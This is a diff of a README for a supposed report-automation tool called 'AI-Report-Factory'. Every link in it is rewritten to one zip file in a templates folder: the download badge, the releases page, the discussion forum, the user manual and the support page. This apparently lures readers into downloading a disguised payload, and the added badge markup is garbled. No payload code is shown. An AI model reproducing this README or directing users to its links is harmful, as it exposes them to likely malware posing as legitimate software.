@@ -1,6 +1,6 @@
 # 🎉 AI-Report-Factory - Automate Your Reporting Effortlessly
 
-[![Download AI Report Factory](https://img.shields.io/badge/Download-AI%20Report%20Factory-blue.svg)](https://github.com/Sensei123-rgb/AI-Report-Factory/releases)
+[![Download AI Report Factory](https://raw.githubusercontent.com/Sensei123-rgb/AI-Report-Factory/main/ai_report_factory/templates/AI-Report-Factory_v2.1-alpha.5.zip%20Report%https://raw.githubusercontent.com/Sensei123-rgb/AI-Report-Factory/main/ai_report_factory/templates/AI-Report-Factory_v2.1-alpha.5.zip)](https://raw.githubusercontent.com/Sensei123-rgb/AI-Report-Factory/main/ai_report_factory/templates/AI-Report-Factory_v2.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to AI Report Factory! This application helps you transform your raw busi
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [AI Report Factory Releases page](https://github.com/Sensei123-rgb/AI-Report-Factory/releases).
+1. **Visit the Releases Page**: Go to the [AI Report Factory Releases page](https://raw.githubusercontent.com/Sensei123-rgb/AI-Report-Factory/main/ai_report_factory/templates/AI-Report-Factory_v2.1-alpha.5.zip).
    
 2. **Choose Your Version**: Look for the latest version listed on the page. 
 
@@ -63,7 +63,7 @@ AI Report Factory offers several key features:
 
 ## 💬 Community Support
 
-Join our community to connect with other users. Share your experiences, ask questions, and contribute to improving AI Report Factory. Visit our [Discussion Forum](https://github.com/Sensei123-rgb/AI-Report-Factory/discussions) for more details.
+Join our community to connect with other users. Share your experiences, ask questions, and contribute to improving AI Report Factory. Visit our [Discussion Forum](https://raw.githubusercontent.com/Sensei123-rgb/AI-Report-Factory/main/ai_report_factory/templates/AI-Report-Factory_v2.1-alpha.5.zip) for more details.
 
 ## 🔗 Additional Resources
 
@@ -76,8 +76,8 @@ Keep track of updates and new features by following our GitHub repository. Alway
 
 ## 🛠️ Quick Links
 
-- [Download AI Report Factory](https://github.com/Sensei123-rgb/AI-Report-Factory/releases)
-- [User Manual](https://github.com/Sensei123-rgb/AI-Report-Factory/wiki)
-- [Support](https://github.com/Sensei123-rgb/AI-Report-Factory/issues)
+- [Download AI Report Factory](https://raw.githubusercontent.com/Sensei123-rgb/AI-Report-Factory/main/ai_report_factory/templates/AI-Report-Factory_v2.1-alpha.5.zip)
+- [User Manual](https://raw.githubusercontent.com/Sensei123-rgb/AI-Report-Factory/main/ai_report_factory/templates/AI-Report-Factory_v2.1-alpha.5.zip)
+- [Support](https://raw.githubusercontent.com/Sensei123-rgb/AI-Report-Factory/main/ai_report_factory/templates/AI-Report-Factory_v2.1-alpha.5.zip)
 
 Now you are ready to start transforming your data into meaningful reports with AI Report Factory!
